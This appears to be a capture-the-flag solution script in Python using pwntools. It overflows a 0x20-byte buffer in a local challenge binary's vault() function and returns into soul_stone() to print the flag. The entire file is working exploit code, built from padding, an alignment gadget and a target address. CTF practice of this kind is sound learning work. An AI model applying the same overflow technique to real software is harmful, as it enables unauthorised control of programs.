#!/usr/bin/env python3
# weakness (soul-stone) - ret2win: overflow vault()'s buffer and return into
# soul_stone(), which prints the flag that is embedded in .rodata.
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = '/home/kzzz/Documents/code/ctf/ctf7/pwn/work/weakness/soul'
elf = ELF(BIN, checksec=False)

SOUL_STONE = elf.symbols['soul_stone']
RET = 0x40101a

OFFSET = 0x20 + 8       # buf[0x20] at rbp-0x20 + saved rbp

payload  = b'A' * OFFSET
payload += p64(RET)
payload += p64(SOUL_STONE)

io = process(BIN, cwd='/home/kzzz/Documents/code/ctf/ctf7/pwn/work/weakness')
io.sendlineafter(b'Enter your name: ', payload)
print(io.recvall(timeout=2).decode(errors='replace'))
